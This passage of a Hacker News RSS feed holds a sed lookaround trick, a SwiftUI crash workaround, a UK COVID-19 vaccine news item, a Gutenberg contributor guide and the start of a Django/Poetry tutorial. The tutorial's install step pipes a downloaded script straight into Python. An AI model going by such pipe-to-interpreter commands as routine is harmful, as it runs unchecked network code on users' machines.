<p>Add space at word boundaries, but not at the start or end of string. Also, don't add space if it is already present. Here, negated character class on space character is enough to emulate the assertion.</p>
<pre><code><span>$ s=</span><span>'total= num1+35*42/num2'

</span><span># same as: perl -lpe 's/(?&lt;=[^ ])\b(?=[^ ])/ /g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>':a s/([^ ])\b([^ ])/\1 \2/; ta;'</span><span>
total </span><span>=</span><span> num1 </span><span>+ </span><span>35 </span><span>* </span><span>42 </span><span>/</span><span> num2
</span></code></pre>
<p>Replace <code>par</code> with <code>[xyz]</code> as long as <code>part</code> occurs as a whole word later in the line. Here, the nature of the modified string itself prevents the possibility of infinite loop.</p>
<pre><code><span>$ s=</span><span>'par spare part party'

</span><span># same as: perl -pe 's/par(?=.*\bpart\b)/[xyz]/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>':a s/par(.*\bpart\b)/[xyz]\1/; ta'
</span><span>[xyz] s[xyz]e part party
</span></code></pre><h2 id="summary">Summary<a href="#summary" aria-label="Anchor link for: summary">🔗</a></h2>
<p>Branching commands and some creative preprocessing of the input can be combined to emulate lookaround assertions in <code>sed</code>. Given that <a href="https://catonmat.net/proof-that-sed-is-turing-complete">Unix utility sed is Turing complete</a>, it's perhaps not a big surprise. Now, please excuse me, I'll be busy reaping points on stackoverflow/unix.stackexchange for this edge case ;)</p>

    </div>

    
    

    

    
    
</article></div>]]>
            </description>
            <link>https://learnbyexample.github.io/sed-lookarounds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950673</guid>
            <pubDate>Sat, 31 Oct 2020 11:47:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Captain Richard de Crespigny (Qantas Flight 32) retired today]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950657">thread link</a>) | @turrini
<br/>
October 31, 2020 | http://breakingavnews.com/2020/10/31/covid-19-has-terminated-my-career-hero-of-a380-flight-qf32-grounded/ | <a href="https://web.archive.org/web/*/http://breakingavnews.com/2020/10/31/covid-19-has-terminated-my-career-hero-of-a380-flight-qf32-grounded/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://breakingavnews.com/2020/10/31/covid-19-has-terminated-my-career-hero-of-a380-flight-qf32-grounded/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950657</guid>
            <pubDate>Sat, 31 Oct 2020 11:43:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging SwiftUI: Trials and Tribulations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950647">thread link</a>) | @kaishin
<br/>
October 31, 2020 | https://redalemeden.com/blog/2020/debugging-swiftui-trials-and-tribulations | <a href="https://web.archive.org/web/*/https://redalemeden.com/blog/2020/debugging-swiftui-trials-and-tribulations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><section><p><a href="https://redalemeden.com/microblog/post-1570576215962"><strong>Assumed audience</strong></a>: <!-- -->people interested SwiftUI or UI programming in general<!-- -->.<!-- --> </p><div>
<p>I have been using <a href="https://developer.apple.com/xcode/swiftui/">SwiftUI</a> since day one, on both client and side projects. It’s an incredibly refreshing way of coding interfaces for Apple devices, but it’s far from being wrinkle-free. The framework’s bold ambitions are sometimes hampered by subpar debugging tools and arcane, seemingly random limitations.</p>
<p>I previously <a href="https://redalemeden.com/blog/2020/this-week-i-learned-24#programming">wrote</a> about a SwiftUI bug that gave me quite a run for my money:</p>
<blockquote>
<p>The stack trace isn’t of much help and no amount of view hierarchy tweaks got rid of it entirely. Initially I was under the impression that either my code or one of my external dependencies were doing something horribly wrong, but <a href="https://steipete.com/posts/state-of-swiftui/">this post</a> from Peter Steinberger made me realize that it is a rather widespread issue.</p>
</blockquote>
<p>Since I didn’t manage to reproduce it on a particular test device at the time, I assumed it’s yet another simulator quirk. But a little over a month later, the same bug reared its ugly head on a test device. Fun times!</p>
<p>The app in question uses tab navigation where the first tab is always accessible, while the second tab shows different content depending on whether the user is signed in to their account or not. The view code looked roughly like this:</p>
<pre data-language="swift" data-index="0"><code><span><span><span>TabView </span><span>{</span></span></span>
<span><span><span>  </span><span>Home</span><span>()</span></span></span>
<span><span><span>    .tabItem </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>    .tag </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span></span></span>
<span><span><span>  </span><span>if</span><span> isSignedIn </span><span>{</span></span></span>
<span><span><span>    </span><span>Profile</span><span>()</span></span></span>
<span><span><span>      .tabItem </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>      .tag </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>  </span><span>}</span><span> </span><span>else</span><span> </span><span>{</span></span></span>
<span><span><span>    </span><span>SignIn</span><span>()</span></span></span>
<span><span><span>      .tabItem </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>      .tag </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>  </span><span>}</span></span></span>
<span><span><span>}</span></span></span></code></pre>
<p>To avoid the <code>isSignedIn</code> boolean check in multiple modifiers, I opted for an <code>if-else</code> block with separate views and <code>tabItem</code> modifiers.<sup id="fnref-1"><a href="#fn-1">1</a></sup> Except that didn’t seem to sit right with SwiftUI for some reason. The app launches and displays the content of the first tab exactly as intended. But when I switch tabs—or god forbid, sign in or out—the app crashes with this cryptic error message:</p>
<pre data-language="" data-index="1"><code><span><span>[error] precondition failure: invalid size for indirect attribute: &lt;number&gt; vs &lt;number&gt;</span></span></code></pre>
<p>The call stack points exclusively to SwiftUI internals, with the last call referring to a certain <code>AG::Graph</code>—<a href="https://steipete.com/posts/state-of-swiftui/#swiftui-attributegraph-crashes">responsible</a> for holding the view tree and diffing it. As far as debugging goes, this is very, <em>very</em> little to work with.</p>
<p>With my hands tied, I briefly considered resurrecting the <code>UITabBarController</code> wrapper I used prior to WWDC, especially since I didn’t manage to make a reproducible test case or submit a feedback to Apple. At first, I spent an inordinate amount of time tweaking the view hierarchies of the profile and sign-in screens themselves, with varying—and rather inconsistent—levels of success. I ran out of both time and patience, so I moved on to other things to not stall the project any further. Weeks later, I came back to the problematic screen—pitchfork in hand—ready to gut the entire tab navigation and replace it with a custom-made solution. I had had enough.</p>
<p>But then came the proverbial aha moment: what if the conditional check took place <em>inside</em> the second tab, instead of <em>around</em> it?</p>
<pre data-language="swift" data-index="2"><code><span><span><span>TabView </span><span>{</span></span></span>
<span><span><span>  </span><span>Home</span><span>()</span></span></span>
<span><span><span>    .tabItem </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>    .tag </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span></span></span>
<span><span><span>  </span><span>ProfileOrSignIn</span><span>(</span><span>isSignedIn</span><span>:</span><span> $isSignedIn</span><span>)</span></span></span>
<span><span><span>    .tabItem </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>    .tag </span><span>{</span><span> </span><span>/* ... */</span><span> </span><span>}</span></span></span>
<span><span><span>}</span></span></span></code></pre>
<p>And <em>just</em> like that, the crasher was gone. Squashed into oblivion.</p>
<p>If this sounds dumb, it’s because it is. At no point did the compiler chastise me for doing something I wasn’t supposed to do. And to make matters worse, the documentation doesn’t mention anything related to… wait, what documentation?</p>
<p>It’s a bittersweet feeling when you fix a bug in a non-deterministic, haphazard way. On one hand you are elated you’ve managed to fix it at all. On the other, you feel somewhat powerless and insecure about your ability to handle similar situations in the future. I adore SwiftUI, but moments like these give me a good dose of anticipatory anxiety—the kind that erodes trust and dampen the thrill of being at the bleeding edge.</p>

</div></section><hr></article></div></div>]]>
            </description>
            <link>https://redalemeden.com/blog/2020/debugging-swiftui-trials-and-tribulations</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950647</guid>
            <pubDate>Sat, 31 Oct 2020 11:42:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hospital CEO says UK to start distributing Covid-19 vaccine in early December]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950600">thread link</a>) | @Bologo
<br/>
October 31, 2020 | https://www.psychnewsdaily.com/hospital-ceo-says-uk-to-start-distributing-covid-19-vaccine-in-early-december/ | <a href="https://web.archive.org/web/*/https://www.psychnewsdaily.com/hospital-ceo-says-uk-to-start-distributing-covid-19-vaccine-in-early-december/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4878" role="main"><div><div><div><p>The CEO of a group of London hospitals has <a href="https://www.ad.nl/binnenland/arts-over-coronavaccin-in-nederland-half-december-haalbaar-br~a39cc634/">told the Dutch newspaper <em>Algemeen Dagblad</em></a> that he has received instructions from the British government to make concrete plans for two million Londoners to receive a <a href="https://www.psychnewsdaily.com/web-searches-for-covid-19-keywords-predict-outbreaks-weeks-in-advance/">COVID-19</a> vaccine in December.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p><p>Dutchman <a href="http://www.uclh.nhs.uk/aboutus/whoweare/bod/Pages/Directorprofiles.aspx#MarcelLevi">Marcel Levi is the CEO of University College London&nbsp;Hospitals</a> (UCLH) as well as a professor and dean at University College London. He heads seven teaching hospitals in London.</p><p>In an <a href="https://www.ad.nl/binnenland/arts-over-coronavaccin-in-nederland-half-december-haalbaar-br~a39cc634/" target="_blank" rel="noreferrer noopener">interview</a> published in <em>Algemeen Dagblad</em> this morning (Saturday, October 31), Levi said that concrete plans are underway for the vaccination to be administered to millions of people in the United Kingdom starting in early December.</p><h2>COVID-19 vaccine before Christmas</h2><p><a href="https://www.linkedin.com/in/marcel-levi-85a3a2a/?originalSubdomain=nl">Levi</a> said the British government has commissioned him make a plan to vaccinate some two million London residents against corona starting in early December.</p><p>“I was given a pretty difficult assignment last week,” he said. “I’ve been tasked with making a detailed plan, including locations, for the vaccination of two million people in North and Central London between the first and third weeks of December. So that’s very concrete,” he said. <span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p><p>“Everyone is enthusiastic. People are thinking this is the light at the end of the tunnel. Let’s go for it,” Levi added.</p><p>Several thousand staff at the University College London Hospitals, which Levi leads, are participating in the Phase 3 study of the AstraZeneca vaccine. Levi himself also got an injection. “I had pain in my arm for two days, muscle pain. Thirty percent of people get a little fever, like the flu. That is why it is also advisable to take paracetamol before vaccination. But the staff are doing well,” he said. “I don’t know anyone who has any major complaints.”</p><p>In the Western world, the pharmaceutical companies AstraZeneca and Pfizer are the furthest along in developing a COVID-19 vaccine. Levi said that “everything indicates that these two vaccines have a good immune response against the <a href="https://www.psychnewsdaily.com/your-cough-cloud-is-7-to-23-times-larger-when-youre-not-wearing-a-mask/">coronavirus</a> and are safe.”</p><h2>Calculated risks</h2><p>“I don’t think it’s rocket science,” <a href="https://www.ad.nl/wetenschap/doe-niet-zo-krampachtig-en-breng-het-coronavaccin-nu-al-op-de-markt~a1526f7c/">Levi told the newspaper</a>. “AstraZeneca’s Oxford vaccine is now being tested on 50,000 people, and one person has experienced a serious side effect but has also recovered. Contrast that to the many hundreds of people who die every day, to hospitals that are filling up. And the only remedy we have now is shutting down society. Shouldn’t we have the courage to say: we will release it?”<span data-ez-name="psychnewsdaily_com-box-4"></span></p><p>“You take a certain risk by releasing the vaccine now. But it is a limited, very small risk,” he said. “And you take that because the alternative is much worse. Let’s assume there’s a 1 in 50,000 risk of a serious side effect with the Oxford vaccine. The chance that you will have a traffic accident in the Netherlands is 1 in 1000 per year. Nobody is talking about that. You have to put things in perspective.”</p><p>In the Netherlands, <a href="https://www.government.nl/government/members-of-cabinet/hugo-de-jonge">Health Minster Hugo de Jonge</a> has taken a more cautious approach. He has said that a vaccine is unlikely to become available in the Netherlands before the first months of 2021.</p><p>“If there are images from England of rows of people getting vaccinated,” Levi said, “then I think it will happen everywhere, including in the Netherlands. That’s the way politicians are.”</p><hr><p><strong>Photo:</strong> <a href="https://unsplash.com/@thisisengineering?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">ThisisEngineering RAEng</a> via <a href="https://unsplash.com/s/photos/lab?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p><p>For a weekly summary of the latest psychology news, subscribe to our <a href="https://www.psychnewsdaily.com/the-psych-news-weekly-newsletter/" target="_blank" rel="noreferrer noopener">Psych News Weekly newsletter</a>.</p></div></div></div></article></div>]]>
            </description>
            <link>https://www.psychnewsdaily.com/hospital-ceo-says-uk-to-start-distributing-covid-19-vaccine-in-early-december/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950600</guid>
            <pubDate>Sat, 31 Oct 2020 11:32:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Nocode Contributor Journey on the WordPress Gutenberg GitHub Repo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950565">thread link</a>) | @bph
<br/>
October 31, 2020 | https://icodeforapurpose.com/a-nocode-contributor-journey-on-the-wordpress-gutenberg-github-repo/ | <a href="https://web.archive.org/web/*/https://icodeforapurpose.com/a-nocode-contributor-journey-on-the-wordpress-gutenberg-github-repo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
		<section id="primary">
			<main id="main" role="main">

<article id="post-137">

	

	<div>
		


<p>I have been a contributor to WordPress since 2014. I serve as Deputy on the Community team, and as team rep for Bock-Editor Enduser documentation team. I am also a roockie contributor on the Gutenberg GitHub repo for WordPress’ block editor. </p>



<p>Earlier this week, Mark Uriane asked me to review a PR, that fixed an issue, I found. It was the first time someone asked me for a review via the GitHub process. I wanted to mark that day and retrace the steps of my Gutenberg GitHub journey.  </p>



<div><figure><img loading="lazy" width="327" height="231" src="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-11.02.38-AM.png" alt="" srcset="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-11.02.38-AM.png 327w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-11.02.38-AM-300x212.png 300w" sizes="(max-width: 327px) 100vw, 327px"></figure></div>



<p>I have not contributed any code to Gutenberg. My first and only Pull Request (PR) was a correction on a handbook file. </p>



<p>This post is for all people, who would like to contribute to Gutenberg, but don’t know how. I want to encourage starting their journey, too. </p>



<p>There is a learning curve on all things Gutenberg on GitHub, mostly because of the Git lingo. Below I started <a href="#glossary">a Glossary.</a> </p>



<h2>Set your GitHub account </h2>



<p>Signing up for GitHub is the easy first step. You can do it <a href="https://github.com/">right on the homepage</a>. I must have started my GitHub account some time in 2012 as my first fork was code from a speaker at <a href="http://ncdevcon.com/">NCDevCon </a>2012</p>



<h2><a href="https://github.com/WordPress/gutenberg/issues/new/choose">Create issues</a> on Gutenberg</h2>



<p>On January 27, 2018, I filed my <a href="https://github.com/WordPress/gutenberg/issues/4711">first Gutenberg issue(#4711)</a>.  To date, I filed 48 issues, 36 are closed, 12 are still open on this repo. </p>



<p>There are four templates to choose from. Security issue need to go some place else. </p>



<figure><img loading="lazy" width="700" height="439" src="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-11.11.22-AM.png" alt="" srcset="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-11.11.22-AM.png 700w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-11.11.22-AM-300x188.png 300w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<p>The editor will convert your formatting into Markdown and you can drag and drop screenshots and other graphics into the space. For our company repositories, I have become a fan of the checklist feature. </p>



<p>For demonstrating the issues, I often use videos or animated GIFs, recorded with  <a href="https://recordit.co/">Recordit</a>. </p>



<p>Before we head deeper into the GitHub Journey, here are short description of terms. You can <a href="#pr">skip over it</a>  continue the journey <a href="#pr">here</a></p>



<div><div>
<h2 id="glossary">Glossary</h2>



<p><strong>Git</strong> – Git is a distributed version-control system for tracking changes in source code during software development.&nbsp;<a href="https://en.wikipedia.org/wiki/Git">(Wikipedia)</a></p>



<p><strong>GitHub</strong> – GitHub, Inc. is an American multinational corporation that provides hosting for software development and version control using Git. It offers the distributed version control and source code management functionality of Git, plus its own features. <a href="https://en.wikipedia.org/wiki/GitHub">(Wikipedia)</a></p>



<p><strong>Issues</strong> are bugs or enhancements tickets reported from users, and contributors take on to solve via a specific PR. </p>



<p><strong>Fork </strong>– is a copy of a repository (repo) that is now in your GitHub account, rather than the WordPress account. Here are instructions on <a href="https://developer.wordpress.org/block-editor/contributors/develop/git-workflow/#keeping-your-fork-up-to-date">how to keep your fork in synch</a> with the WordPress repo. </p>



<p><strong>PR is a Pull Request</strong> – contribution to the files in the repo. Issues that resulted into a PR will be closed when the PR is part of a future release. </p>



<p>Once the PR is reviewed, a committer will merge it into the main branch here called “master”. God is that hard not to use any jargon.<em> </em>Let’s unpack this a bit further. </p>



<p><strong>Repo</strong> = short for GitHub repository; the space where all the code of a product, plugin or module lives. </p>



<p><strong>Committer</strong> = contributor who has the rights to merge code from other developers into the main branch </p>



<p><strong>Merge </strong>– workflow to merge new code into the right places with other code. </p>



<p><strong>Review </strong> = a review of the submitted code. The person who submits a PR can mention specific persons to review their submission and comment or approved it for future release.  Sometimes multiple reviewers and reviews are needed to prepare code for a merge into the main branch and to make it into the next release</p>



<p><strong>Main Branch</strong> – That’s where all the code from different contributors comes together and is used to issue new software releases. For the Gutenberg Repo that main branch is called “master”, other WordPress repos named their main branch “trunk”, see also <a href="https://github.com/WordPress/twentytwentyone">Twenty-Twenty-one Theme</a> repository</p>
</div></div>



<h2 id="pr">Create a Pull Request (PR) </h2>



<p>Creating a PR doesn’t have to be about code. It could also be updates to documentation pages that are tracked in the Gutenberg repository. However, you still need to go <a href="https://developer.wordpress.org/block-editor/contributors/develop/git-workflow/">through the Git Workflow</a> and it can be quite daunting. My one and only PR is from March 12, 2018. I updated a link in the documentation. </p>



<h2>Join the Triage Team </h2>



<blockquote><p>“Triage is the practice of reviewing existing issues and pull requests to make sure they’re relevant, actionable, and have all the information they need. Anyone can help triage, although you’ll need to be a member of the triage team for the Gutenberg repository to modify an issue’s labels or edit its title.”</p><cite><a href="https://developer.wordpress.org/block-editor/">Block Editor Handbook</a>&nbsp;/&nbsp;<a href="https://developer.wordpress.org/block-editor/contributors/">Contributor Guide</a>&nbsp;/&nbsp;Triage</cite></blockquote>



<p>On August 14, 2020, I joined the Triage Team for the sole purpose to identify issues and PRs that need consideration for the Block Editor End User Documentation team, lovingly called the 🐝-docs team. <a href="https://docs.google.com/document/d/1VcwjesspLHt-dTEhuTF74LQ09RB4WWceumlxBFOLaI8/edit#">I  am exploring a whole process for this.</a> </p>



<p>For now, I do not attend triage meetings, and don’t triage issues beyond finding the issues and PRs for “UserDocumentation”. I just don’t have the time to do more. </p>



<h2 id="pr-review">My first PR Review</h2>



<p>Earlier this month, I did a testing sprint on the <a href="https://icodeforapurpose.com/testing-twenty-twenty-one/">Twenty-Twenty-One theme</a>, while I was setting up this site.  </p>



<p>Mark Uraine is a designer at Automattic, WordPress contributor and <a href="https://gutenbergtimes.com/podcast/">my co-host on the Gutenberg Changelog podcast</a>. He worked on dark styles updates to blocks, so they are better usable on themes with dark backgrounds like this one. <a href="https://github.com/WordPress/gutenberg/pull/26483">On one of his PRs</a>, fixed my issue “<em><a href="https://github.com/WordPress/gutenberg/issues/26479">Some block features are rendered with invisible ink with dark backgrounds.”</a></em> Columns and Table outlines didn’t have enough contrast to be seen on the dark background. Mark requested a review of his PR to make sure it fixed the issues I was seeing. </p>



<figure><img loading="lazy" width="585" height="89" src="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-9.25.01-AM.png" alt="" srcset="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-9.25.01-AM.png 585w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-30-at-9.25.01-AM-300x46.png 300w" sizes="(max-width: 585px) 100vw, 585px"><figcaption>Snippet from PR Dark mode UI updates</figcaption></figure>



<p>As mentioned above, that was the first time I had a request for a review, so I needed to find out what I had to do to test a PR. Pull Requests are created in separate branches of the repo. It’s code that hasn’t been released yet and needs to be tested before it merges into the master branch. </p>



<p><a href="https://github.com/WordPress/gutenberg/issues/25202">Paal Joachim Romdahl wrote good to follow instructions</a> for this next step on my Gutenberg GitHub journey. </p>



<h3>Check out the PR Branch</h3>



<p>I already had a Gutenberg master repo clone on my system. I started with  check out of the PRs branch: <code>git checkout update/dark-mode-for-specific-blocks</code> – this copied the branch (PR) to my local version of gutenberg.</p>



<p>I already went through <code>npm install</code> and <code>npm build</code> and now needed to spin up a WordPress local install. </p>



<h3>Spin up local WordPress environment</h3>



<p>The command <code>npx wp-env start</code> starts a wp-env instance within the Gutenberg folder. It ran into some error. I needed to start <a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a> first. Then it downloaded  WordPress. It was ready for me to test the PR on my local WP development environment site via &nbsp;<strong><a href="http://localhost:8888/">http://localhost:8888/</a></strong>  Just in case, I forget,  use admin/password for WP admin access. </p>



<p>This also had me look up the <a href="https://icodeforapurpose.com/difference-between-npm-and-npx/">difference between npm and npx</a>. </p>



<p>For alternative way to organize the local WordPress environment, <a href="https://michael.blog/2020/06/12/my-gutenberg-setup/">Michael Arestad gives you a detailed insight into his Gutenberg setup</a>.</p>



<figure><img loading="lazy" width="941" height="202" src="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.42-AM.png" alt="" srcset="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.42-AM.png 941w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.42-AM-300x64.png 300w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.42-AM-768x165.png 768w" sizes="(max-width: 941px) 100vw, 941px"></figure>



<p>Back on GitHub, I added my review comment. Thank God, it doesn’t “count toward mergeability”! I can’t imagine the havoc I could wreak if I had merged capabilities. </p>



<figure><img loading="lazy" width="320" height="231" src="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.54-AM.png" alt="" srcset="https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.54-AM.png 320w, https://icodeforapurpose.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-27-at-10.48.54-AM-300x217.png 300w" sizes="(max-width: 320px) 100vw, 320px"></figure>



<p>And there was a checkmark next to my name in the list of reviewers of the PR. Yay. </p>



<h2>Testing Gutenberg from Master branch</h2>



<p>Gutenberg has a bi-weekly release cycle, which mean every two weeks, you get an update of the Gutenberg plugin into your WordPress instance, and if you subscribed to automatic updates, you don’t have to do anything. On Monday, the team prepares a release candidate version and then two days later the new plugin version is released. </p>



<p>Another way to contribute to WordPress and Gutenberg is taking part by testing pre-release versions. Until a couple of weeks ago, testing Gutenberg from the master branch wasn’t easy. </p>



<p>On October 15, 2020, I started a new project on Gutenberg Times to provide a download of the Gutenberg plugin, built from the master branch. </p>







<p>For this project I do the following: </p>



<ul><li>Update my local git branch with changes on the wordpress/gutenberg/master branch <code>git pull</code></li><li>Modify the gutenberg.php file to update the version</li><li>run the build plugin script <strong><code>npm run build:plugin-zip</code></strong></li><li>rename the zip file</li><li>Upload to Gutenberg Times. </li></ul>



<p>I am working with the maintainer for the Beta Tester Plugin, Andy Fragen, on getting this into the plugin update system on WordPress. He also created the <a href="https://github.com/afragen/github-updater">GitHub Updater</a> I will use to implement a proper version control and a mechanism to update existing sites. </p>



<p>Will have it later this week. </p>



<p>Now Process: </p>



<ul><li>1) download from Gutenberg Times, </li><li>2) continue downloading new versions from Gutenberg Times or install GitHub Updater to get automatic updates. </li></ul>



<h2>Contributing to Gutenberg</h2>



<p>If you want to learn more about contributing to the block editor, the best place to start is the <a href="https://developer.wordpress.org/block-editor/contributors/">Contributor Guide for Gutenberg</a> and join the <a href="https://make.wordpress.org/chat/">WP Slack space</a>, channel #core-editor. </p>



<p>Anne McCarthy wrote <a href="https://make.wordpress.org/core/handbook/tutorials/navigating-the-community/">wonderful compass for navigating the Community</a> you are about to start to join. </p>



<h3>Good First Issues</h3>



<p>For inspiration on what your first code contribution could be, browse the <a href="https://github.com/WordPress/gutenberg/issues?q=is%3Aissue+is%3Aopen+label%3A%22Good+First+Issue%22">Good First Issues</a> list. These are issues hand-curated by Gutenberg developer specifically for new contributors to tackle. </p>



<p>Marcus Kazmierczak posted step-by-step instructions in his post <a href="https://mkaz.blog/code/good-first-issue-on-gutenberg/">“Good first issue on Gutenberg”</a>. </p>



<p>There is also a Twitter Bot tweeting new <a href="https://twitter.com/goodfirstbugs">@Good First Bugs</a> from the Gutenberg repo as well as from <a href="https://core.trac.wordpress.org/">WordPress core trac</a>.  </p>



<figure></figure>



<h3>Needs Testing </h3>



<p>Many issues need a second pair of eyes to do some additional testing to confirm and provide more details on Issues filed. The triage team flags those with the <a href="https://github.com/WordPress/gutenberg/issues?q=is%3Aissue+is%3Aopen+label%3A%22Needs+Testing%22">Needs testing</a> label </p>



<h3>Good First Review</h3>



<p>Testing is also part of the PR Review process and Gutenberg developers flag specific PRs as <a href="https://github.com/WordPress/gutenberg/labels/Good%20First%20Review">Good First Review</a>. </p>



<p>The Contributor Guide has more notes <a href="https://developer.wordpress.org/block-editor/contributors/repository-management/#code-review">Code Review</a> and <a href="https://developer.wordpress.org/block-editor/contributors/repository-management/#design-review">Design Review</a>. </p>



<p>That’s it for now! I will work on the Zip from Master plugin next month and continue the work on the Block …</p></div></article></main></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://icodeforapurpose.com/a-nocode-contributor-journey-on-the-wordpress-gutenberg-github-repo/">https://icodeforapurpose.com/a-nocode-contributor-journey-on-the-wordpress-gutenberg-github-repo/</a></em></p>]]>
            </description>
            <link>https://icodeforapurpose.com/a-nocode-contributor-journey-on-the-wordpress-gutenberg-github-repo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950565</guid>
            <pubDate>Sat, 31 Oct 2020 11:26:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Managing a Django Project with Poetry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950553">thread link</a>) | @rasulkireev
<br/>
October 31, 2020 | https://rasulkireev.com/managing-django-with-poetry/ | <a href="https://web.archive.org/web/*/https://rasulkireev.com/managing-django-with-poetry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Poetry is relatively new packaging and dependency manager. It makes it very easy to upload libraries to <a href="https://pypi.org/" target="_blank" rel="nofollow noopener noreferrer">PyPI</a>, manage dependencies visually, and has a couple of handy features. Today, I'm not going to do a deep dive into how <a href="https://python-poetry.org/" target="_blank" rel="nofollow noopener noreferrer">Poetry</a> works and all its features. Today I just want to focus on configuring a <a href="https://www.djangoproject.com/" target="_blank" rel="nofollow noopener noreferrer">Django</a> project. </p><h2 id="1-install-poetry">1. Install Poetry</h2><pre><code><span>curl</span> -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py <span>|</span> python -</code></pre><h2 id="2-create-a-directory-for-you-django-project">2. Create a Directory for you Django Project</h2><pre><code><span>mkdir</span> django_poetry_example <span>&amp;&amp;</span> <span>ls</span> django_poetry_example</code></pre><h2 id="3-initiate-a-poetry-project">3. Initiate a Poetry Project</h2><pre><code>poetry init</code></pre><p>You will be asked to confirm the information about your project. You can skip through most of it.</p><p><img src="https://rasulkireev.com/assets/static/poetry_init.cd61fdf.02d3f24e444ee33cc2ed0480e0f26c9f.png" width="1168" alt="Poetry Init Output.png" data-old-src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 1168 1014' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-3f0bcb35e360abd46db43de97b7cba01'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-3f0bcb35e360abd46db43de97b7cba01)' width='1168' height='1014' 